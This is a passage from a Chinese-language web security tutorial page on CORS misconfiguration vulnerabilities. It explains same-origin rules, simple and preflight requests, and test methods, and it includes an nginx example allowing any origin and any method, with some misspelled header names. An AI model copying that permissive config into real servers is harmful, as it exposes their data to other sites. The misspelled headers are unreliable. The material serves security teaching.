
<!DOCTYPE HTML>
<html lang="zh-hans" >
    <head>
        <meta charset="UTF-8">
        <title>CORS 跨域漏洞 · zha0cai's Security Book</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="HonKit 4.0.0">
        <meta name="author" content="zha0cai">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-versions-select/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-versions-select/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-flexible-alerts/style.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-ace/ace.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../email/readme.html" />
    
    
    <link rel="prev" href="readme.html" />
    

    <script src="../gitbook/gitbook-plugin-graph/d3.min.js"></script>
    <script src="../gitbook/gitbook-plugin-graph/function-plot.js"></script>    

    
    <link rel="stylesheet" href="../gitbook/gitbook-plugin-chart/c3/c3.min.css">
    <script src="../gitbook/gitbook-plugin-chart/c3/d3.min.js"></script>
    <script src="../gitbook/gitbook-plugin-chart/c3/c3.min.js"></script>
    

    </head>
    <body>
        
<div class="book honkit-cloak">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="输入并搜索" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://github.com/zha0cai" target="_blank" class="custom-link">My github</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        <li class="header">Readme</li>
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Security Book
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Web Book</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="readme.html">
            
                <a href="readme.html">
            
                    
                    Web
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="2.1.1" data-path="CORS 跨域漏洞.html">
            
                <a href="CORS 跨域漏洞.html">
            
                    
                    CORS 跨域漏洞
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Redteam Book</li>
        
        
    

    
        
        <li class="header">Email Book</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../email/readme.html">
            
                <a href="../email/readme.html">
            
                    
                    Email
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.1" data-path="../email/Attack Email.html">
            
                <a href="../email/Attack Email.html">
            
                    
                    Attack Email
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2" data-path="../email/邮件协议.html">
            
                <a href="../email/邮件协议.html">
            
                    
                    邮件协议
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Network Book</li>
        
        
    

    
        
        <li class="header">Other Book</li>
        
        
    

    

    <li class="divider"></li>

    <li>
        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
            本书使用 HonKit 发布
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >CORS 跨域漏洞</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#0x01-漏洞描述"><b></b>0x01 漏洞描述</a></li><ul><li><span class="title-icon "></span><a href="#概述"><b></b>概述</a></li><li><span class="title-icon "></span><a href="#测试方法"><b></b>测试方法</a></li></ul><li><span class="title-icon "></span><a href="#0x02-cors-详解"><b></b>0x02 CORS 详解</a></li><ul><li><span class="title-icon "></span><a href="#cors-工作流程（针对浏览器的）"><b></b>CORS 工作流程（针对浏览器的）</a></li><li><span class="title-icon "></span><a href="#什么是同源--跨域"><b></b>什么是同源 &amp; 跨域</a></li><li><span class="title-icon "></span><a href="#一些应用场景"><b></b>一些应用场景</a></li><li><span class="title-icon "></span><a href="#简单请求"><b></b>简单请求</a></li><ul><li><span class="title-icon "></span><a href="#基本流程"><b></b>基本流程</a></li><li><span class="title-icon "></span><a href="#withcredentials-属性"><b></b>withCredentials 属性</a></li></ul><li><span class="title-icon "></span><a href="#非简单请求"><b></b>非简单请求</a></li><ul><li><span class="title-icon "></span><a href="#预检请求"><b></b>预检请求</a></li><li><span class="title-icon "></span><a href="#预检请求的回应"><b></b>预检请求的回应</a></li><li><span class="title-icon "></span><a href="#浏览器的正常请求和回应"><b></b>浏览器的正常请求和回应</a></li></ul></ul><li><span class="title-icon "></span><a href="#0x03-cors-错误配置类型"><b></b>0x03 CORS 错误配置类型</a></li><ul><li><span class="title-icon "></span><a href="#反射-origin-头"><b></b>反射 Origin 头</a></li><li><span class="title-icon "></span><a href="#origin-校验错误"><b></b>Origin 校验错误</a></li><li><span class="title-icon "></span><a href="#信任-null"><b></b>信任 null</a></li><li><span class="title-icon "></span><a href="#https-域信任-http-域"><b></b>HTTPS 域信任 HTTP 域</a></li><li><span class="title-icon "></span><a href="#信任自身全部子域"><b></b>信任自身全部子域</a></li><li><span class="title-icon "></span><a href="#​origin​​​-与-credentialstrue​​​-共用"><b></b>​Origin:*​​​ 与 Credentials:true​​​ 共用</a></li><li><span class="title-icon "></span><a href="#缺少-varyorigin​​​-头"><b></b>缺少 Vary:Origin​​​ 头</a></li></ul><li><span class="title-icon "></span><a href="#0x04-挖掘利用"><b></b>0x04 挖掘利用</a></li><ul><li><span class="title-icon "></span><a href="#方法一：检测工具"><b></b>方法一：检测工具</a></li><ul><li><span class="title-icon "></span><a href="#exp--poc"><b></b>EXP &amp; POC</a></li><li><span class="title-icon "></span><a href="#绕过-httponly-获取-cookie"><b></b>绕过 http_only 获取 cookie</a></li></ul><li><span class="title-icon "></span><a href="#方法二：利用-burpsuit"><b></b>方法二：利用 Burpsuit</a></li><li><span class="title-icon "></span><a href="#方法三：curl-命令"><b></b>方法三：curl 命令</a></li><li><span class="title-icon "></span><a href="#方法四：浏览器测试"><b></b>方法四：浏览器测试</a></li><li><span class="title-icon "></span><a href="#实验测试"><b></b>实验测试</a></li><li><span class="title-icon "></span><a href="#获取用户凭证"><b></b>获取用户凭证</a></li><li><span class="title-icon "></span><a href="#绕过基于-ip-的认证"><b></b>绕过基于 IP 的认证</a></li><li><span class="title-icon "></span><a href="#客户端缓存中毒"><b></b>客户端缓存中毒</a></li><li><span class="title-icon "></span><a href="#服务器端缓存中毒"><b></b>服务器端缓存中毒</a></li><li><span class="title-icon "></span><a href="#配合-xss-劫持会话"><b></b>配合 XSS 劫持会话</a></li></ul><li><span class="title-icon "></span><a href="#0x05-修复方法"><b></b>0x05 修复方法</a></li><ul><li><span class="title-icon "></span><a href="#方法一：使用通配符-​​"><b></b>方法一：使用通配符 *​​</a></li><li><span class="title-icon "></span><a href="#方法二：指定域名白名单"><b></b>方法二：指定域名白名单</a></li><li><span class="title-icon "></span><a href="#方法三：使用正则表达式"><b></b>方法三：使用正则表达式</a></li></ul><li><span class="title-icon "></span><a href="#0x00-前人栽树"><b></b>0x00 前人栽树</a></li></ul></div><a href="#0x01-漏洞描述" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="0x01-漏洞描述"><a name="0x01-漏洞描述" class="anchor-navigation-ex-anchor" href="#0x01-漏洞描述"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 漏洞描述</h1>
<h2 id="概述"><a name="概述" class="anchor-navigation-ex-anchor" href="#概述"><i class="fa fa-link" aria-hidden="true"></i></a>概述</h2>
<p>CORS，跨域资源共享（<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS" target="_blank">Cross-Origin Resource Sharing</a>），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。</p>
<p>当 CORS 的设置不正确时，就会带来安全问题；当响应头中的 <code>Access-Control-Allow-Origin</code>​​ 设置为 <code>null</code>​​ 或 <code>*​​</code> 时，表示信任任何域，这时候就可能引入安全问题。</p>
<blockquote>
<p><a href="https://blog.huli.tw/2017/08/27/ajax-and-cors/#:~:text=%E3%80%8C%E4%BD%A0%E7%9A%84%20Request%20%E9%82%84%E6%98%AF%E6%9C%89%E7%99%BC%E5%87%BA%E5%8E%BB%E7%9A%84%E3%80%8D%EF%BC%8C%E8%80%8C%E4%B8%94%E7%80%8F%E8%A6%BD%E5%99%A8%E4%B9%9F%E3%80%8C%E7%A2%BA%E5%AF%A6%E6%9C%89%E6%94%B6%E5%88%B0%20Response%E3%80%8D%EF%BC%8C%E9%87%8D%E9%BB%9E%E6%98%AF%E3%80%8C%E7%80%8F%E8%A6%BD%E5%99%A8%E5%9B%A0%E7%82%BA%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%EF%BC%8C%E4%B8%8D%E6%8A%8A%E7%B5%90%E6%9E%9C%E5%82%B3%E5%9B%9E%E7%B5%A6%E4%BD%A0%E7%9A%84%20JavaScript%E3%80%8D%E3%80%82%E5%A6%82%E6%9E%9C%E6%B2%92%E6%9C%89%E7%80%8F%E8%A6%BD%E5%99%A8%E7%9A%84%E8%A9%B1%E5%85%B6%E5%AF%A6%E5%B0%B1%E6%B2%92%E6%9C%89%E9%80%99%E4%BA%9B%E5%95%8F%E9%A1%8C%EF%BC%8C%E4%BD%A0%E6%84%9B%E7%99%BC%E7%B5%A6%E8%AA%B0%E5%B0%B1%E7%99%BC%E7%B5%A6%E8%AA%B0%EF%BC%8C%E4%B8%8D%E7%AE%A1%E6%80%8E%E6%A8%A3%E9%83%BD%E6%8B%BF%E5%BE%97%E5%88%B0%20Response%E3%80%82" target="_blank">「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。</a></p>
<p>當瀏覽器收到 Response 之後，會先檢查 Access-Control-Allow-Origin​​​ 裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。</p>
</blockquote>
<p>所以，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js​​​ 对响应资源的操作。【该漏洞的测试误区，要注意同源限制策略是针对浏览器的】</p>
<p><img src="assets/CORS%20跨域漏洞.png" alt></p>
<h2 id="测试方法"><a name="测试方法" class="anchor-navigation-ex-anchor" href="#测试方法"><i class="fa fa-link" aria-hidden="true"></i></a>测试方法</h2>
<ol>
<li>测试人员访问某个 url，将请求头中的 Origin 字段修改为任意值，结果仍然能获得正确的响应报文（这会导致误报不应该使用该测试方法），就说明有 CORS 漏洞</li>
<li>可以通过浏览器的控制台的 network，查看接口的请求包 response 头中 Access-Control-Allow-Origin 是否设置为 <code>*</code>​​</li>
<li>也可以通过抓包工具，查看接口返回的 response 中是 Access-Control-Allow-Origin 是否设置为 <code>*</code> or null 等其他配置组合，详见下文。​​</li>
</ol>
<p><strong>漏洞示例</strong></p>
<p>配置 Access-Control-Allow-Origin 为 <code>*</code>​​</p>
<p><img src="assets/CORS%20跨域漏洞-1.png" alt></p>
<p>配置 Access-Control-Allow-Origin 但是该值可控</p>
<p><img src="assets/CORS%20跨域漏洞-2.png" alt></p>
<h1 id="0x02-cors-详解"><a name="0x02-cors-详解" class="anchor-navigation-ex-anchor" href="#0x02-cors-详解"><i class="fa fa-link" aria-hidden="true"></i></a>0x02 CORS 详解</h1>
<p>CORS 是一个 W3C 标准，全称是&quot;跨域资源共享&quot;（Cross-origin resource sharing）。CORS 的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。</p>
<p>它允许浏览器向跨源服务器，发出 <a href="https://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank">XMLHttpRequest</a>​​​ ​请求，从而克服了 AJAX 只能<a href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank">同源</a>使用的限制</p>
<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p>
<p><strong>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与</strong>。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。<strong>浏览器一旦发现 AJAX​​ 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</strong></p>
<p>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p>
<ul>
<li><p>JSONP 只支持 GET​​ 请求，CORS 支持所有类型的 HTTP 请求。</p>
</li>
<li><p>JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>
</li>
</ul>
<h2 id="cors-工作流程（针对浏览器的）"><a name="cors-工作流程（针对浏览器的）" class="anchor-navigation-ex-anchor" href="#cors-工作流程（针对浏览器的）"><i class="fa fa-link" aria-hidden="true"></i></a>CORS 工作流程（针对浏览器的）</h2>
<ol>
<li>请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加 Origin 头，用于声明请求方的源。</li>
<li>资源服务器根据请求中 Origin 头返回访问控制策略(Access-Control-Allow-Origin 响应头)，并在其中声明允许读取响应内容的源。</li>
<li><strong>浏览器检查</strong>资源服务器在 Access-Control-Allow-Origin 头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。</li>
</ol>
<p><img src="assets/CORS%20跨域漏洞-3.png" alt></p>
<h2 id="什么是同源--跨域"><a name="什么是同源--跨域" class="anchor-navigation-ex-anchor" href="#什么是同源--跨域"><i class="fa fa-link" aria-hidden="true"></i></a>什么是同源 &amp; 跨域</h2>
<p><strong>同源</strong>：协议相同 &amp; 端口相同 &amp; 主机（域名）相同</p>
<p><strong>跨域</strong>：上述之一不同，如</p>
<ul>
<li>网络协议不同，如 http 协议访问 https 协议 ;</li>
<li>端口不同，如 80 端口访问 8080 端口 ;</li>
<li>域名不同，如 www.test1.com 访问 www.test2.com ;</li>
<li>子域名不同，如 abc.test1.com 访问 def.test1.com ;</li>
</ul>
<blockquote>
<p>浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
</blockquote>
<h2 id="一些应用场景"><a name="一些应用场景" class="anchor-navigation-ex-anchor" href="#一些应用场景"><i class="fa fa-link" aria-hidden="true"></i></a>一些应用场景</h2>
<ul>
<li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。</li>
<li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域。</li>
<li>电商网站想通过用户浏览器加载第三方快递网站的物流信息。</li>
<li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li>
</ul>
<h2 id="简单请求"><a name="简单请求" class="anchor-navigation-ex-anchor" href="#简单请求"><i class="fa fa-link" aria-hidden="true"></i></a>简单请求</h2>
<p>只要同时满足以下两大条件，就属于<a href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/CORS#%E7%B0%A1%E5%96%AE%E8%AB%8B%E6%B1%82" target="_blank">简单请求</a>。</p>
<blockquote>
<p>（1）请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP 的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application/x-www-form-urlencoded​​、multipart/form-data​​、text/plain​​</li>
</ul>
</blockquote>
<p>这是为了兼容表单（form），因为历史上<strong>表单</strong>一直可以发出跨域请求。AJAX​​ 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。</p>
<p>凡是不同时满足上面两个条件，就属于<strong>非简单请求</strong>。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<h3 id="基本流程"><a name="基本流程" class="anchor-navigation-ex-anchor" href="#基本流程"><i class="fa fa-link" aria-hidden="true"></i></a>基本流程</h3>
<blockquote>
<p>对于简单请求，浏览器直接发出 CORS 请求。</p>
<p>具体来说，就是在头信息之中，增加一个 Origin​​ ​字段。</p>
</blockquote>
<p>下面是一个例子，浏览器发现这次跨源 AJAX​​ 请求是简单请求，就自动在头信息之中，添加一个 Origin​​ ​字段。</p>
<pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cors</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://api.bob.com
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.alice.com
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0...
</code></pre>
<p>上面的头信息中，Origin​ ​字段用来说明，本次请求来自哪个源（<code>协议 + 域名 + 端口</code>）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果 Origin​​ ​指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 Access-Control-Allow-Origin​​ ​字段（详见下文），就知道出错了，从而抛出一个错误，被 XMLHttpRequest​​ ​的 onerror​​ ​回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。</p>
<p><strong>如果 Origin​ ​指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</strong></p>
<pre><code class="lang-http">Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access_control-Allow-Method: *
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
</code></pre>
<p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以 <code>Access-Control-​</code> ​开头。</p>
<p>（1）Access-Control-Allow-Origin</p>
<p>该字段是必须的。它的值要么是请求时 Origin​​ 字段的值，要么是一个 <code>*​​</code> ，表示接受任意域名的请求。</p>
<p>（2）Access-Control-Allow-Credentials</p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie​​。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true​​​，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true​​​，如果服务器不要浏览器发送 Cookie，删除该字段即可。</p>
<p>（3）Access-Control-Expose-Headers</p>
<p>该字段可选。CORS 请求时，XMLHttpRequest​​ ​对象的 <code>getResponseHeader()</code>​​ ​方法只能拿到 6 个基本字段：Cache-Control​​​、Content-Language​​​、Content-Type​​​、Expires​​​、Last-Modified​​​、Pragma​​​。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers​​ ​里面指定。上面的例子指定，getResponseHeader(&apos;FooBar&apos;)​​ ​可以返回 FooBar​​ ​字段的值。</p>
<p>（4）Access-Control-Allow-Methods​</p>
<p>该字段表示允许请求的方法，比如 GET, POST, PUT, DELETE 等</p>
<p>​add_header &apos;Access-Control-Allow-Methods&apos; <code>*</code>;​​  // 表示允许任意方法</p>
<p><strong>服务端的 Nginx 配置</strong></p>
<p>请确保将配置行添加到 http​​ 配置块的大括号 ({}​​) 内并保存重启 Nginx。</p>
<pre><code class="lang-nginx"><span class="hljs-section">http</span> {
    <span class="hljs-attribute">include</span>       mime.types;
    <span class="hljs-attribute">default_type</span>  application/octet-stream;

    <span class="hljs-comment"># 其他配置...</span>

    <span class="hljs-comment"># 添加下面这行配置，允许跨域请求的网站</span>
    <span class="hljs-comment">#add_header &apos;Access-Control-Allow-Origin&apos; &apos;http://xxx.xxx.xxx&apos;;</span>
    <span class="hljs-attribute">add_header</span> <span class="hljs-string">&apos;Access-Control-Allow-Origin&apos;</span> <span class="hljs-string">&apos;*&apos;</span>;
    <span class="hljs-comment">#add_header &apos;Access-Control-Allow-Credential&apos; &apos;true&apos;;</span>
    <span class="hljs-attribute">add_header</span> <span class="hljs-string">&apos;Access_control-Allow-Method&apos;</span> <span class="hljs-string">&apos;*&apos;</span>;

    <span class="hljs-comment"># 其他配置...</span>
}
</code></pre>
<h3 id="withcredentials-属性"><a name="withcredentials-属性" class="anchor-navigation-ex-anchor" href="#withcredentials-属性"><i class="fa fa-link" aria-hidden="true"></i></a>withCredentials 属性</h3>
<p>上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 <code>Access-Control-Allow-Credentials</code>​ ​字段。</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true
</code></pre>
<p>另一方面，开发者必须在 AJAX​​ 请求中打开 withCredentials​​ ​属性。</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
xhr.withCredentials = <span class="hljs-literal">true</span>;
</code></pre>
<p>否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p>
<p>但是，如果省略 withCredentials​ ​设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭 withCredentials​​。</p>
<pre><code class="lang-javascript">xhr.withCredentials = <span class="hljs-literal">false</span>;
</code></pre>
<p>需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin​​ ​就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie​​ ​也无法读取服务器域名下的 Cookie。</p>
<h2 id="非简单请求"><a name="非简单请求" class="anchor-navigation-ex-anchor" href="#非简单请求"><i class="fa fa-link" aria-hidden="true"></i></a>非简单请求</h2>
<p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT​​ 或 DELETE​​，或者 Content-Type​​ 字段的类型是 <code>application/json</code>​​。</p>
<p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为<code>&quot;预检&quot;请求（preflight​​）</code>。</p>
<h3 id="预检请求"><a name="预检请求" class="anchor-navigation-ex-anchor" href="#预检请求"><i class="fa fa-link" aria-hidden="true"></i></a>预检请求</h3>
<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest​ ​请求，否则就报错。</p>
<p>下面是一段浏览器的 JavaScript 脚本，在浏览器 consolo​​ 执行。</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> url = <span class="hljs-string">&apos;http://api.alice.com/cors&apos;</span>;
<span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
xhr.open(<span class="hljs-string">&apos;PUT&apos;</span>, url, <span class="hljs-literal">true</span>);
xhr.setRequestHeader(<span class="hljs-string">&apos;X-Custom-Header&apos;</span>, <span class="hljs-string">&apos;value&apos;</span>);
xhr.send();
</code></pre>
<p>上面代码中，HTTP 请求的方法是 PUT​​，并且发送一个自定义头信息 X-Custom-Header​​。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的 HTTP 头信息。</p>
<pre><code class="lang-http"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/cors</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://api.bob.com
<span class="hljs-attribute">Access-Control-Request-Method</span><span class="hljs-punctuation">: </span>PUT
<span class="hljs-attribute">Access-Control-Request-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.alice.com
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0...
</code></pre>
<p>&quot;预检&quot;请求用的请求方法是 <code>OPTIONS</code>​​​，表示这个请求是用来询问的。头信息里面，关键字段是 Origin​​​，表示请求来自哪个源。</p>
<p>除了 Origin​ ​字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</p>
<p>（1）Access-Control-Request-Method</p>
<p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT​​。</p>
<p>（2）Access-Control-Request-Headers</p>
<p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 X-Custom-Header​​​​。</p>
<p><a href="https://blog.huli.tw/2017/08/27/ajax-and-cors/#cors:~:text=%E5%81%87%E8%A8%AD%E4%BB%8A%E5%A4%A9%E6%9F%90%E5%80%8B,Request%20%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82" target="_blank">为什么需要预请求？</a></p>
<blockquote>
<p>假設今天某個 Server 提供了一個 API 網址叫做：<a href>https://example.com/data/16</a>​​，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。</p>
<p>如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。</p>
<p>因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。</p>
<p>如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。</p>
<p><strong>先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。</strong></p>
</blockquote>
<h3 id="预检请求的回应"><a name="预检请求的回应" class="anchor-navigation-ex-anchor" href="#预检请求的回应"><i class="fa fa-link" aria-hidden="true"></i></a>预检请求的回应</h3>
<p>服务器收到&quot;预检&quot;请求以后，检查了 Origin​​、Access-Control-Request-Method​ ​和 Access-Control-Request-Headers​ ​字段以后，确认允许跨源请求，就可以做出回应。</p>
<pre><code class="lang-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 01 Dec 2008 01:15:39 GMT
<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache/2.0.61 (Unix)
<span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>http://api.bob.com
<span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST, PUT
<span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8
<span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>gzip
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0
<span class="hljs-attribute">Keep-Alive</span><span class="hljs-punctuation">: </span>timeout=2, max=100
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain
</code></pre>
<p>上面的 HTTP 回应中，关键的是 Access-Control-Allow-Origin​​ ​字段，表示 <a href="http://api.bob.com​​" target="_blank">http://api.bob.com​​</a> ​可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<pre><code class="lang-http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>*
